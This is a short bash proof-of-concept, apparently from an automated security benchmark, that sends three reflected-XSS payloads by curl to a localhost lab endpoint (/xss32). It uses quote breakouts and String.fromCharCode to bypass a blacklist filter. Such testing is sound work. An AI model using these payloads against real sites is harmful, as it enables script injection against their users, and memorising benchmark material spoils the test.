#!/bin/bash
# POC: Demonstrates Reflected XSS vulnerability in /xss32 endpoint by bypassing alphanumeric blacklist filter with special characters payload
# Target: ./repo
# Created: 2025-11-06T21:48:31.787Z
# Session: benchmark-XBEN-010-24-mhny8l0w

# Reflected XSS POC for /xss32 endpoint
# Demonstrates bypass of alphanumeric blacklist filter

TARGET_URL="http://localhost:5000/xss32"
OUTPUT_FILE="/tmp/xss32_response.html"

echo "[*] Testing Reflected XSS in /xss32 endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Test Payload 1: Simple quote to break string context
echo "[*] Payload 1: Quote character bypass"
PAYLOAD1='";alert("XSS1");//'
echo "[*] Sending payload: $PAYLOAD1"
curl -s -X POST "$TARGET_URL" \
  -d "name=$PAYLOAD1" \
  -o "$OUTPUT_FILE"

# Check if the payload is reflected in the response
if grep -q 'alert' "$OUTPUT_FILE"; then
    echo "[+] SUCCESS: Payload 1 reflected in response"
    echo "[+] Response contains 'alert' keyword"
else
    echo "[-] Payload 1 not reflected as expected"
fi
echo ""

# Test Payload 2: Concatenation operator bypass
echo "[*] Payload 2: Concatenation operator + escape"
PAYLOAD2='"+alert("XSS2")+"'
echo "[*] Sending payload: $PAYLOAD2"
curl -s -X POST "$TARGET_URL" \
  -d "name=$PAYLOAD2" \
  -o "$OUTPUT_FILE"

if grep -q 'alert' "$OUTPUT_FILE"; then
    echo "[+] SUCCESS: Payload 2 reflected in response"
    echo "[+] Response contains 'alert' keyword"
else
    echo "[-] Payload 2 not reflected as expected"
fi
echo ""

# Test Payload 3: Comment bypass
echo "[*] Payload 3: Comment bypass"
PAYLOAD3='");alert(String.fromCharCode(88,83,83));//'
echo "[*] Sending payload: $PAYLOAD3"
curl -s -X POST "$TARGET_URL" \
  -d "name=$PAYLOAD3" \
  -o "$OUTPUT_FILE"

if grep -q 'alert' "$OUTPUT_FILE"; then
    echo "[+] SUCCESS: Payload 3 reflected in response"
    echo "[+] Response contains 'alert' keyword"
else
    echo "[-] Payload 3 not reflected as expected"
fi
echo ""

# Show a sample of the response containing the vulnerability
echo "[*] Sample response content (first reflected payload):"
echo "---"
PAYLOAD_TEST='");/*'
curl -s -X POST "$TARGET_URL" \
  -d "name=$PAYLOAD_TEST" | grep -A 5 -B 5 'script' | head -20
echo "---"
echo ""

echo "[+] XSS vulnerability demonstration complete"
echo "[*] POC shows that special characters can bypass the blacklist filter"